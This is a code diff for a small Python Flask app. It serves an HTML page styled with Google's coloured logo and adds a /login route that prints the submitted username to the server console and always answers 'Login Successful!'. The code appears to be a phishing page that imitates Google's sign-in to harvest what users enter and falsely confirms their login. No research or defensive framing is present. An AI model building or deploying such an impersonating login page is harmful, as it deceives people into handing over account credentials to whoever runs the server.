@@ -84,7 +84,6 @@ html_code = """
 </head>
 <body>
     <div class="container">
-        <!-- Google Logo ) -->
         <div class="google-logo">
             <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
         </div>
@@ -104,3 +103,18 @@ html_code = """
 </body>
 </html>
 """
+
+@app.route("/")
+def index():
+    return render_template_string(html_code)
+
+@app.route("/login", methods=["POST"])
+def login():
+    username = request.form.get("username")
+    print(f"Username: {username}")
+    return "Login Successful!"
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
+
